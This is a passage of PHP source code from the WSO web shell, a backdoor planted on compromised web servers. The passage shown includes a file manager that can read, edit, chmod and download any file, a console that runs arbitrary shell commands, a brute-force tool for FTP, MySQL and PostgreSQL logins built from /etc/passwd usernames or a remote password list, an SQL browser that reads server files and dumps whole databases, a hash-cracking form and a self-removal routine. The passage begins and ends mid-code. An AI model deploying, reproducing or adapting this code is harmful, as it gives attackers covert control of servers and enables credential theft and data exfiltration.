				$tmp = array('name' => $dirContent[$i], 'file_path' => $GLOBALS['cwd'] . $dirContent[$i], 'modify' => date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])), 'perms' => wsoPermsColor($GLOBALS['cwd'] . $dirContent[$i]), 'size' => @filesize($GLOBALS['cwd'] . $dirContent[$i]), 'owner' => $ow['name'] ? $ow['name'] : @fileowner($dirContent[$i]), 'group' => $gr['name'] ? $gr['name'] : @filegroup($dirContent[$i]));

				if (@is_file($GLOBALS['cwd'] . $dirContent[$i])) $files[] = array_merge($tmp, array('type' => 'file'));

				elseif (@is_link($GLOBALS['cwd'] . $dirContent[$i])) $dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['file_path'])));

				elseif (@is_dir($GLOBALS['cwd'] . $dirContent[$i]) && ($dirContent[$i] != ".")) $dirs[] = array_merge($tmp, array('type' => 'dir'));

			}

			$GLOBALS['sort'] = $sort;

			function wsoCmp($a, $b) {

				if ($GLOBALS['sort'][0] != 'size') return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]])) * ($GLOBALS['sort'][1] ? 1 : -1);

				else return (($a['size'] < $b['size']) ? -1 : 1) * ($GLOBALS['sort'][1] ? 1 : -1);

			}

			usort($files, "wsoCmp");

			usort($dirs, "wsoCmp");

			$files = array_merge($dirs, $files);

			$l = 0;

			foreach ($files as $f) {

				$file_style = 'style="color:' . wsoPermsColorOnly($GLOBALS['cwd'] . $f['name']) . '"';

				echo '<tr' . ($l ? ' class=l1' : '') . '>

							<td><input type=checkbox name="f[]" value="' . urlencode($f['name']) . '" class=chkbx></td>

							<td><a ' . $file_style . ' href="javascript:' . (!@is_readable($GLOBALS['cwd'] . $f['name']) ? '">' . ($f['type'] == 'dir' ?'[ '.htmlspecialchars($f['name']).' ]':htmlspecialchars($f['name'])) : ($f['type'] == 'file' ? 'g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\',\'' . (is_writable($GLOBALS['cwd'] . $f['name']) ? 'edit' : 'view') . '\')">' . htmlspecialchars($f['name']) : 'g(\'FilesMan\',\'' . $f['file_path'] . '\')" ' . (empty($f['link']) ? '' : 'title="' . $f['link'] . '"') . '><b>'.($f['type'] == 'dir' ?'[ '.htmlspecialchars($f['name']).' ]':htmlspecialchars($f['name'])).'</b>')) . '</a></td>

							<td>' . ($f['type'] == 'file' ? wsoViewSize($f['size']) : $f['type']) . '</td>

							<td><input type=text value="' . $f['modify'] . '" title="' . $f['name'] . '" class="touch-field hoverable"></td>

							<td>' . $f['owner'] . '/' . $f['group'] . '</td>

							<td><a href=\'javascript:p=prompt("enter new permissions, like 0777","' . substr(sprintf('%o', fileperms($f['name'])), -4) . '");p&&g("FilesTools",null,"' . urlencode($f['name']) . '","chmod",p)\'>' . $f['perms'] . '</a></td>

							<td>

								<a href=# title="'.$f['name'].'" class="copy">[ copy name ]</a>

								<a href=# title="'.$GLOBALS['cwd'].$f['name'].'" class="copy">[ copy path ]</a>

								<a href=\'javascript:p=prompt("enter new filename","' . urlencode($f['name']) . '");p&&g("FilesTools",null,"' . urlencode($f['name']) . '","rename",p)\'>[ rename ]</a>

							</td>

							</tr>';

				$l = $l ? 0 : 1;

			}

			echo "

				<tr><td colspan=7 class=file-actions>

				<input type=hidden name=a value='FilesMan'>

				<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'>

				<input type='submit' name='p1' value='copy' />

				<input type='submit' name='p1' value='move' />

				<input type='submit' name='p1' value='delete' /> ";

			if (class_exists('ZipArchive')) {

				echo "<input type='submit' name='p1' value='zip' /> <input type='submit' name='p1' value='unzip' /> ";

			}

			echo "<input type='submit' name='p1' value='tar' /> ";

			if (!empty($_COOKIE['act']) && count($_COOKIE['f'])) {

				echo "<input type='submit' name='p1' value='paste' /> ";

			}

			if (!empty($_COOKIE['act']) && @count($_COOKIE['f']) && (($_COOKIE['act'] == 'zip') || ($_COOKIE['act'] == 'tar'))) {

				echo "file name: <input type=text name=p2 value='wso_" . date("Ymd_His") . "." . ($_COOKIE['act'] == 'zip' ? 'zip' : 'tar.gz') . "'>";

			}

			echo "

				</td>

				</tr></form></table>

				</div>";

			wsoFooter();

		}

		function actionStringTools() {

			if (!function_exists('hex2bin')) {

				function hex2bin($p) {

					return decbin(hexdec($p));

				}

			}

			if (!function_exists('binhex')) {

				function binhex($p) {

					return dechex(bindec($p));

				}

			}

			if (!function_exists('hex2ascii')) {

				function hex2ascii($p) {

					$r = '';

					for ($i = 0;$i < strLen($p);$i+= 2) {

						$r.= chr(hexdec($p[$i] . $p[$i + 1]));

					}

					return $r;

				}

			}

			if (!function_exists('ascii2hex')) {

				function ascii2hex($p) {

					$r = '';

					for ($i = 0;$i < strlen($p);++$i) $r.= sprintf('%02X', ord($p[$i]));

					return strtoupper($r);

				}

			}

			if (!function_exists('full_urlencode')) {

				function full_urlencode($p) {

					$r = '';

					for ($i = 0;$i < strlen($p);++$i) $r.= '%' . dechex(ord($p[$i]));

					return strtoupper($r);

				}

			}

			$stringTools = array('Base64 encode' => 'base64_encode', 'Base64 decode' => 'base64_decode', 'Url encode' => 'urlencode', 'Url decode' => 'urldecode', 'Full urlencode' => 'full_urlencode', 'md5 hash' => 'md5', 'sha1 hash' => 'sha1', 'crypt' => 'crypt', 'CRC32' => 'crc32', 'ASCII to HEX' => 'ascii2hex', 'HEX to ASCII' => 'hex2ascii', 'HEX to DEC' => 'hexdec', 'HEX to BIN' => 'hex2bin', 'DEC to HEX' => 'dechex', 'DEC to BIN' => 'decbin', 'BIN to HEX' => 'binhex', 'BIN to DEC' => 'bindec', 'String to lower case' => 'strtolower', 'String to upper case' => 'strtoupper', 'Htmlspecialchars' => 'htmlspecialchars', 'String length' => 'strlen',);

			if (isset($_POST['ajax'])) {

				WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true);

				ob_start();

				if (in_array($_POST['p1'], $stringTools)) echo $_POST['p1']($_POST['p2']);

				$temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "\n\r\t\\'\0") . "';\n";

				echo strlen($temp), "\n", $temp;

				exit;

			}

			if (empty($_POST['ajax']) && !empty($_POST['p1'])) WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);

			wsoHeader();

			echo '<h1>String conversions</h1><div class=content>';

			echo "<form name='toolsForm' onSubmit='a(null,null,this.selectTool.value,this.input.value);return false;'><select name='selectTool'>";

			foreach ($stringTools as $k => $v) echo "<option value='" . htmlspecialchars($v) . "'>" . $k . "</option>";

			echo "</select><input type='submit' value='>>'/> <input type=hidden name=ajax value=1><br><textarea name='input' style='margin-top:5px' class=bigarea>" . (empty($_POST['p1']) ? '' : htmlspecialchars(@$_POST['p2'])) . "</textarea></form><pre class='ml1' style='" . (empty($_POST['p1']) ? 'display:none;' : '') . "margin-top:5px' id='strOutput'>";

			if (!empty($_POST['p1'])) {

				if (in_array($_POST['p1'], $stringTools)) echo htmlspecialchars($_POST['p1']($_POST['p2']));

			}

			echo "</pre></div><br><h1>Search files:</h1><div class=content>

			<form onsubmit=\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\"><table cellpadding='1' cellspacing='0' width='50%'>

				<tr><td width='1%'>Text:</td><td><input type='text' name='text' style='width:100%'></td></tr>

				<tr><td>Path:</td><td><input type='text' name='cwd' value='" . htmlspecialchars($GLOBALS['cwd']) . "' style='width:100%'></td></tr>

				<tr><td>Name:</td><td><input type='text' name='filename' value='*' style='width:100%'></td></tr>

				<tr><td></td><td><input type='submit' value='>>'></td></tr>

				</table></form>";

			function wsoRecursiveGlob($file_path) {

				if (substr($file_path, -1) != '/') $file_path.= '/';

				$file_paths = @array_unique(@array_merge(@glob($file_path . $_POST['p3']), @glob($file_path . '*', GLOB_ONLYDIR)));

				if (is_array($file_paths) && @count($file_paths)) {

					foreach ($file_paths as $item) {

						if (@is_dir($item)) {

							if ($file_path != $item) wsoRecursiveGlob($item);

						} else {

							if (empty($_POST['p2']) || @strpos(@file_get_contents($item), $_POST['p2']) !== false) echo "<a href='#' onclick='g(\"FilesTools\",null,\"" . urlencode($item) . "\", \"view\",\"\")'>" . htmlspecialchars($item) . "</a><br>";

						}

					}

				}

			}

			if (@$_POST['p3']) wsoRecursiveGlob($_POST['c']);

			echo "</div><br><h1>Search for hash:</h1><div class=content>

			<form method='post' target='_blank' name='hf'>

				<input type='text' name='hash' style='width:200px;'><br>

				<input type='hidden' name='act' value='find'/>

				<input type='button' value='hashcracking.ru' onclick=\"document.hf.action='https://hashcracking.ru/index.php';document.hf.submit()\"><br>

				<input type='button' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>

				<input type='button' value='crackfor.me' onclick=\"document.hf.action='http://crackfor.me/index.php';document.hf.submit()\"><br>

			</form></div>";

			wsoFooter();

		}

		function actionFilesTools() {

			if (isset($_POST['p1'])) $_POST['p1'] = urldecode($_POST['p1']);

			if (@$_POST['p2'] == 'download') {

				if (@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {

					ob_start("ob_gzhandler", 4096);

					header("Content-Disposition: attachment; filename=" . basename($_POST['p1']));

					if (function_exists("mime_content_type")) {

						$type = @mime_content_type($_POST['p1']);

						header("Content-Type: " . $type);

					} else header("Content-Type: application/octet-stream");

					$fp = @fopen($_POST['p1'], "r");

					if ($fp) {

						while (!@feof($fp)) echo @fread($fp, 1024);

						fclose($fp);

					}

				}

				exit;

			}

			if (@$_POST['p2'] == 'mkfile') {

				if (!file_exists($_POST['p1'])) {

					$fp = @fopen($_POST['p1'], 'w');

					if ($fp) {

						$_POST['p2'] = "edit";

						fclose($fp);

					}

				}

			}

			wsoHeader();

			wsoBreadCrumps();

			echo '<div class=content>';

			if (!file_exists(@$_POST['p1'])) {

				echo 'File not exists';

				wsoFooter();

				return;

			}

			$uid = @posix_getpwuid(@fileowner($_POST['p1']));

			if (!$uid) {

				$uid['name'] = @fileowner($_POST['p1']);

				$gid['name'] = @filegroup($_POST['p1']);

			} else $gid = @posix_getgrgid(@filegroup($_POST['p1']));

			echo '<span>Name:</span> ' . htmlspecialchars(@basename($_POST['p1'])) . ' <span>Size:</span> ' . (is_file($_POST['p1']) ? wsoViewSize(filesize($_POST['p1'])) : '-') . ' <span>Permission:</span> ' . wsoPermsColor($_POST['p1']) . ' <span>Owner/Group:</span> ' . $uid['name'] . '/' . $gid['name'] . '<br>';

			echo '<span>Create time:</span> ' . date('Y-m-d H:i:s', filectime($_POST['p1'])) . ' <span>Access time:</span> ' . date('Y-m-d H:i:s', fileatime($_POST['p1'])) . ' <span>Modify time:</span> ' . date('Y-m-d H:i:s', filemtime($_POST['p1'])) . '<br><br>';

			if (empty($_POST['p2'])) $_POST['p2'] = 'view';

			if (is_file($_POST['p1'])) $m = is_writable($_POST['p1']) ? array('View', 'Download', 'Edit', 'Chmod', 'Rename', 'Touch') : array('View', 'Download');

			else $m = array('Chmod', 'Rename', 'Touch');

			foreach ($m as $v) echo '<a href=# onclick="g(null,null,\'' . urlencode($_POST['p1']) . '\',\'' . strtolower($v) . '\')">' . ((strtolower($v) == @$_POST['p2']) ? '<b>[ ' . $v . ' ]</b>' : $v) . '</a> ';

			echo '<br><br>';

			switch ($_POST['p2']) {

				case 'view':

					echo '<textarea id="textarea">';

					$fp = @fopen($_POST['p1'], 'r');

					if ($fp) {

						while (!@feof($fp)) echo htmlspecialchars(@fread($fp, 1024));

						@fclose($fp);

					}

					echo '</textarea>';

					break;

				case 'chmod':

					if (!empty($_POST['p3'])) {

						$perms = 0;

						for ($i = strlen($_POST['p3']) - 1;$i >= 0;--$i) $perms+= (int)$_POST['p3'][$i] * pow(8, (strlen($_POST['p3']) - $i - 1));

						if (!@chmod($_POST['p1'], $perms)) echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';

					}

					clearstatcache();

					echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',\'chmod\',this.chmod.value);return false;"><input type=text name=chmod value="' . substr(sprintf('%o', fileperms($_POST['p1'])), -4) . '"><input type=submit value=">>"></form>';

					break;

				case 'edit':

					if (!is_writable($_POST['p1'])) {

						echo 'File isn\'t writeable';

						break;

					}

					if (!empty($_POST['p3'])) {

						$time = @filemtime($_POST['p1']);

						$_POST['p3'] = $_POST['p3'];

						$fp = @fopen($_POST['p1'], "w");

						if ($fp) {

							@fwrite($fp, $_POST['p3']);

							@fclose($fp);

							echo 'Saved!<br><script>p3_="";</script>';

							@touch($_POST['p1'], $time, $time);

						}

					}

					echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',\'edit\',textarea.value);return false;" onkeydown="tryToSave(event,this)"><textarea id="textarea" title="' . urlencode($_POST['p1']) . '">';

					$fp = @fopen($_POST['p1'], 'r');

					if ($fp) {

						while (!@feof($fp)) echo htmlspecialchars(@fread($fp, 1024));

						@fclose($fp);

					}

					echo '</textarea><span>Use [  CTRL+Enter ] to save</span></form>';

					break;

				case 'rename':

					if (!empty($_POST['p3'])) {

						if (!@rename($_POST['p1'], $_POST['p3'])) echo 'Can\'t rename!<br>';

						else die('<script>g(null,null,"' . urlencode($_POST['p3']) . '",null,"")</script>');

					}

					echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',\'rename\',this.name.value);return false;"><input type=text name=name value="' . htmlspecialchars($_POST['p1']) . '"><input type=submit value=">>"></form>';

					break;

				case 'touch':

					if (!empty($_POST['p3'])) {

						$time = strtotime($_POST['p3']);

						if ($time) {

							if (!touch($_POST['p1'], $time, $time)) echo 'Fail!';

							else echo 'Touched!';

						} else echo 'Bad time format!';

					}

					clearstatcache();

					echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',\'touch\',this.touch.value);return false;"><input type=text name=touch value="' . date("Y-m-d H:i:s", @filemtime($_POST['p1'])) . '"><input type=submit value=">>"></form>';

					break;

				}

				echo '</div>';

				wsoFooter();

			}

			function actionConsole() {

				if (!empty($_POST['p1']) && !empty($_POST['p2'])) {

					WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'stderr_to_out', true);

					$_POST['p1'].= ' 2>&1';

				}

				if (isset($_POST['ajax'])) {

					WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true);

					ob_start();

					echo "self.cf.cmd.value='';\n";

					$temp = wsoEx($_POST['p1']);

					$temp = $temp ? $temp : "Query did not return anything";

					$temp = addcslashes("\n$ " . $_POST['p1'] . "\n" . $temp, "\n\r\\'\0");

					if (preg_match("!.*cd\s+([^;]+)$!", $_POST['p1'], $match)) {

						if (@chdir($match[1])) {

							$GLOBALS['cwd'] = @getcwd();

							echo "c_='" . $GLOBALS['cwd'] . "';";

						}

					}

					echo "self.cf.output.value+='" . $temp . "';";

					echo "self.cf.output.scrollTop = self.cf.output.scrollHeight;";

					$temp = ob_get_clean();

					echo strlen($temp), "\n", $temp;

					exit;

				}

				if (empty($_POST['ajax']) && !empty($_POST['p1'])) WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);

				wsoHeader();

				echo "<script>

	if(window.Event) window.captureEvents(Event.KEYDOWN);

	var cmds = new Array('');

	var cur = 0;

	function kp(e) {

		var n = (window.Event) ? e.which : e.keyCode;

		if(n == 38) {

			cur--;

			if(cur>=0)

				document.cf.cmd.value = cmds[cur];

			else

				cur++;

		} else if(n == 40) {

			cur++;

			if(cur < cmds.length)

				document.cf.cmd.value = cmds[cur];

			else

				cur--;

		}

	}

	function add(cmd) {

		cmds.pop();

		cmds.push(cmd);

		cmds.push('');

		cur = cmds.length-1;

	}

	</script>";

				echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(/^clear$/.test(self.cf.cmd.value)){self.cf.output.value=[];self.cf.cmd.value=[];return false;}add(this.cmd.value);a(null,null,this.cmd.value,this.show_errors.checked?1:[]);return false;"><select name=alias>';

				foreach ($GLOBALS['aliases'] as $n => $v) {

					if ($v == '') {

						echo '<optgroup label="-' . htmlspecialchars($n) . '-"></optgroup>';

						continue;

					}

					echo '<option value="' . htmlspecialchars($v) . '">' . $n . '</option>';

				}

				echo '</select><input type=button onclick="add(self.cf.alias.value);a(null,null,self.cf.alias.value,self.cf.show_errors.checked?1:[]);" value=">>"> <nobr><input type=hidden name=ajax value=1><input type=checkbox name=show_errors value=1 checked> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';

				if (!empty($_POST['p1'])) {

					echo htmlspecialchars("$ " . $_POST['p1'] . "\n" . wsoEx($_POST['p1']));

				}

				echo '</textarea><table style="border:1px solid var(--main-color);background-color:#555;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td width="1%">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';

				echo '</form></div><script>self.cf.cmd.focus();</script>';

				wsoFooter();

			}

			function actionSelfRemove() {

				if ($_POST['p1'] == 'yes') if (@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__))) die('Shell has been removed');

				else echo 'unlink error!';

				if ($_POST['p1'] != 'yes') wsoHeader();

				echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';

				wsoFooter();

			}

			function actionBruteforce() {

				wsoHeader();

				if (isset($_POST['proto'])) {

					echo '<h1>Results</h1><div class=content><span>Type:</span> ' . htmlspecialchars($_POST['proto']) . ' <span>Server:</span> ' . htmlspecialchars($_POST['server']) . '<br>';

					if ($_POST['proto'] == 'ftp') {

						function wsoBruteForce($ip, $port, $login, $pass) {

							$fp = @ftp_connect($ip, $port ? $port : 21);

							if (!$fp) return false;

							$res = @ftp_login($fp, $login, $pass);

							@ftp_close($fp);

							return $res;

						}

					} elseif ($_POST['proto'] == 'mysql') {

						function wsoBruteForce($ip, $port, $login, $pass) {

							try {

								$res = @new PDO("mysql:host=$ip;", $login, $pass);

								return $res;

							}

							catch(Exception $e) {

								echo !preg_match('/Access denied/i', $e->getMessage()) ? 'Error: ' . $e->getMessage() . "<br>\n" : '';

								return false;

							}

						}

					} elseif ($_POST['proto'] == 'pgsql') {

						function wsoBruteForce($ip, $port, $login, $pass) {

							$str = "host='" . $ip . "' port='" . $port . "' user='" . $login . "' password='" . $pass . "' dbname=postgres";

							$res = @pg_connect($str);

							@pg_close($res);

							return $res;

						}

					}

					$success = 0;

					$attempts = 0;

					$server = explode(":", $_POST['server']);

					if ($_POST['type'] == 1) {

						$temp = @file('/etc/passwd');

						if (is_array($temp)) foreach ($temp as $line) {

							$line = explode(":", $line);

							++$attempts;

							if (wsoBruteForce(@$server[0], @$server[1], $line[0], $line[0])) {

								$success++;

								echo '<b class="text-green">' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars($line[0]) . " SUCCESS<br>\n";

								flush();

								break;

							} else {

								echo '<b class="text-muted">' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars($line[0]) . " fail<br>\n";

								flush();

							}

							if (wsoBruteForce(@$server[0], @$server[1], $line[0], strrev($line[0]))) {

								$success++;

								echo '<b class="text-green">' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars(strrev($line[0])) . " SUCCESS<br>\n";

								flush();

								break;

							} else {

								echo '<b class="text-muted">' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars(strrev($line[0])) . " fail<br>\n";

								flush();

							}

						}

					} elseif ($_POST['type'] == 2) {

						$temp = @file($_POST['dict']);

						$temp[] = '';

						$temp[] = 'root';

						echo 'login: ' . htmlspecialchars($_POST['login']) . ': ';

						if (is_array($temp)) foreach ($temp as $line) {

							$line = trim($line);

							++$attempts;

							if (wsoBruteForce($server[0], @$server[1], $_POST['login'], $line)) {

								$success++;

								echo '<b class="text-green">' . htmlspecialchars($line) . " SUCCESS</b><br>\n";

								flush();

								break;

							} else {

								echo '<b class="text-muted">' . htmlspecialchars($line) . "</b>, ";

								flush();

							}

						}

					}

					echo "<span>Attempts:</span> $attempts <span>Success:</span> $success</div><br>";

				}

				echo '<h1>Bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>' . '<td><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></td></tr><tr><td>' . '<input type=hidden name=c value="' . htmlspecialchars($GLOBALS['cwd']) . '">' . '<input type=hidden name=a value="' . htmlspecialchars($_POST['a']) . '">' . '<span>Server:port</span></td>' . '<td><input type=text name=server value="127.0.0.1"></td></tr>' . '<tr><td><span>Brute type</span></td>' . '<td><label><input type=radio name=type value="1" checked> /etc/passwd</label></td></tr>' . '<tr><td></td><td><label style="padding-left:15px"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</label></td></tr>' . '<tr><td></td><td><label><input type=radio name=type value="2"> Dictionary</label></td></tr>' . '<tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</span></td>' . '<td><input type=text name=login value="root"></td></tr>' . '<tr><td><span>Dictionary</span></td>' . '<td><input type=text name=dict value="https://bit.ly/top1kpass"></td></tr></table>' . '</td></tr><tr><td></td><td><input type=submit value=">>"></td></tr></form></table>';

				echo '</div><br>';

				wsoFooter();

			}

			function actionSql() {

				class DbClass {

					var $type;

					var $link;

					var $res;

					function DbClass($type) {

						$this->type = $type;

					}

					function connect($host, $user, $pass, $dbname) {

						switch ($this->type) {

							case 'mysql':

								if ($this->link = @mysql_connect($host, $user, $pass, true)) return true;

								break;

							case 'pgsql':

								$host = explode(':', $host);

								if (!$host[1]) $host[1] = 5432;

								if ($this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname")) return true;

								break;

							}

							return false;

						}

						function selectdb($db) {

							switch ($this->type) {

								case 'mysql':

									if (@mysql_select_db($db)) return true;

									break;

								}

								return false;

						}

						function query($str) {

							switch ($this->type) {

								case 'mysql':

									return $this->res = @mysql_query($str);

								break;

								case 'pgsql':

									return $this->res = @pg_query($this->link, $str);

								break;

							}

							return false;

						}

						function fetch() {

							$res = func_num_args() ? func_get_arg(0) : $this->res;

							switch ($this->type) {

								case 'mysql':

									return @mysql_fetch_assoc($res);

								break;

								case 'pgsql':

									return @pg_fetch_assoc($res);

								break;

							}

							return false;

						}

						function listDbs() {

							switch ($this->type) {

								case 'mysql':

									return $this->query("SHOW databases");

								break;

								case 'pgsql':

									return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");

								break;

							}

							return false;

						}

						function listTables() {

							switch ($this->type) {

								case 'mysql':

									return $this->res = $this->query('SHOW TABLES');

								break;

								case 'pgsql':

									return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");

								break;

							}

							return false;

						}

						function error() {

							switch ($this->type) {

								case 'mysql':

									return @mysql_error();

								break;

								case 'pgsql':

									return @pg_last_error();

								break;

							}

							return false;

						}

						function setCharset($str) {

							switch ($this->type) {

								case 'mysql':

									if (function_exists('mysql_set_charset')) return @mysql_set_charset($str, $this->link);

									else $this->query('SET CHARSET ' . $str);

									break;

								case 'pgsql':

									return @pg_set_client_encoding($this->link, $str);

									break;

                            }

								return false;

                        }

                        function loadFile($str) {

                            switch ($this->type) {

                                case 'mysql':

                                    return $this->fetch($this->query("SELECT LOAD_FILE('" . addslashes($str) . "') as file"));

                                break;

                                case 'pgsql':

                                    $this->query("CREATE TABLE wso2(file text);COPY wso2 FROM '" . addslashes($str) . "';select file from wso2;");

                                    $r = array();

                                    while ($i = $this->fetch()) $r[] = $i['file'];

                                    $this->query('drop table wso2');

                                    return array('file' => implode("\n", $r));

                                    break;

                            }

                            return false;

                        }

                        function dump($table, $fp = false) {

                            switch ($this->type) {

                                case 'mysql':

                                    $res = $this->query('SHOW CREATE TABLE `' . $table . '`');

                                    $create = mysql_fetch_array($res);

                                    $sql = $create[1] . ";\n";

                                    if ($fp) fwrite($fp, $sql);

                                    else echo ($sql);

                                    $this->query('SELECT * FROM `' . $table . '`');

                                    $i = 0;

                                    $head = true;

                                    while ($item = $this->fetch()) {

                                        $sql = '';

                                        if ($i % 1000 == 0) {

                                            $head = true;

                                            $sql = ";\n\n";

                                        }

                                        $columns = array();

                                        foreach ($item as $k => $v) {

                                            if ($v === null) $item[$k] = "NULL";

                                            elseif (is_int($v)) $item[$k] = $v;

                                            else $item[$k] = "'" . @mysql_real_escape_string($v) . "'";

                                            $columns[] = "`" . $k . "`";

                                        }

                                        if ($head) {

                                            $sql.= 'INSERT INTO `' . $table . '` (' . implode(", ", $columns) . ") VALUES \n\t(" . implode(", ", $item) . ')';

                                            $head = false;

                                        } else $sql.= "\n\t,(" . implode(", ", $item) . ')';

                                        if ($fp) fwrite($fp, $sql);

                                        else echo ($sql);

                                        $i++;

                                    }

                                    if (!$head) if ($fp) fwrite($fp, ";\n\n");

                                    else echo (";\n\n");

                                    break;

                                case 'pgsql':

                                    $this->query('SELECT * FROM ' . $table);

                                    while ($item = $this->fetch()) {

                                        $columns = array();

                                        foreach ($item as $k => $v) {

                                            $item[$k] = "'" . addslashes($v) . "'";

                                            $columns[] = $k;

                                        }

                                        $sql = 'INSERT INTO ' . $table . ' (' . implode(", ", $columns) . ') VALUES (' . implode(", ", $item) . ');' . "\n";

                                        if ($fp) fwrite($fp, $sql);

                                        else echo ($sql);

                                    }

                                    break;

                                }

                                return false;

                            }

                        };

                        $db = new DbClass($_POST['type']);

                        if (@$_POST['p2'] == 'download') {

                            $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);

                            $db->selectdb($_POST['sql_base']);

                            switch ($_POST['charset']) {

                                case "Windows-1251":

                                    $db->setCharset('cp1251');

                                break;

                                case "UTF-8":

                                    $db->setCharset('utf8');

                                break;

                                case "KOI8-R":

                                    $db->setCharset('koi8r');

                                break;

                                case "KOI8-U":

                                    $db->setCharset('koi8u');

                                break;

                                case "cp866":

                                    $db->setCharset('cp866');

                                break;

                            }

                            if (empty($_POST['file'])) {

                                ob_start("ob_gzhandler", 4096);

                                header("Content-Disposition: attachment; filename=dump.sql");

                                header("Content-Type: text/plain");

                                foreach ($_POST['tbl'] as $v) $db->dump($v);

                                exit;

                            } elseif ($fp = @fopen($_POST['file'], 'w')) {

                                foreach ($_POST['tbl'] as $v) $db->dump($v, $fp);

                                fclose($fp);

                                unset($_POST['p2']);

                            } else die('<script>alert("Error! Can\'t open file");window.history.back(-1)</script>');

                        }

                        wsoHeader();

                        echo "

                        <h1>Sql browser</h1><div class=content>

                        <form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr>

                        <td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>

                        <input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'><input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>

                        <td><select name='type'><option value='mysql' ";

                        if (@$_POST['type'] == 'mysql') echo 'selected';

                        echo ">MySql</option><option value='pgsql' ";

                        if (@$_POST['type'] == 'pgsql') echo 'selected';

                        echo ">PostgreSql</option></select></td>

                        <td><input type=text name=sql_host value=\"" . (empty($_POST['sql_host']) ? 'localhost' : htmlspecialchars($_POST['sql_host'])) . "\"></td>

                        <td><input type=text name=sql_login value=\"" . (empty($_POST['sql_login']) ? 'root' : htmlspecialchars($_POST['sql_login'])) . "\"></td>

                        <td><input type=text name=sql_pass value=\"" . (empty($_POST['sql_pass']) ? '' : htmlspecialchars($_POST['sql_pass'])) . "\"></td><td>";

                        $tmp = "<input type=text name=sql_base value=''>";

                        if (isset($_POST['sql_host'])) {

                            if ($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {

                                switch ($_POST['charset']) {

                                    case "Windows-1251":

                                        $db->setCharset('cp1251');

                                    break;

                                    case "UTF-8":

                                        $db->setCharset('utf8');

                                    break;

                                    case "KOI8-R":

                                        $db->setCharset('koi8r');

                                    break;

                                    case "KOI8-U":

                                        $db->setCharset('koi8u');

                                    break;

                                    case "cp866":

                                        $db->setCharset('cp866');

                                    break;

                                }

                                $db->listDbs();

                                echo "<select name=sql_base><option value=''></option>";

                                while ($item = $db->fetch()) {

                                    list($key, $value) = each($item);

                                    echo '<option value="' . $value . '" ' . ($value == $_POST['sql_base'] ? 'selected' : '') . '>' . $value . '</option>';

                                }

                                echo '</select>';

                            } else echo $tmp;

                        } else echo $tmp;

                        echo "</td>

                        <td><input type=submit value='>>' onclick='fs(d.sf);'></td>

                        <td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count']) ? '' : ' checked') . "> count the number of rows</td>

				</tr>

			</table>

			<script>

				s_db='" . @addslashes($_POST['sql_base']) . "';

				function fs(f) {

					if(f.sql_base.value!=s_db) { f.onsubmit = function() {};

						if(f.p1) f.p1.value='';

						if(f.p2) f.p2.value='';

						if(f.p3) f.p3.value='';

					}

				}

				function st(t,l) {

					d.sf.p1.value = 'select';

					d.sf.p2.value = t;

					if(l && d.sf.p3) d.sf.p3.value = l;

					d.sf.submit();

				}

				function is() {

					for(i=0;i<d.sf.elements['tbl[]'].length;++i)

						d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;

				}

			</script>";

							if (isset($db) && $db->link) {

								echo "<br/><table width=100% cellpadding=2 cellspacing=0>";

								if (!empty($_POST['sql_base'])) {

									$db->selectdb($_POST['sql_base']);

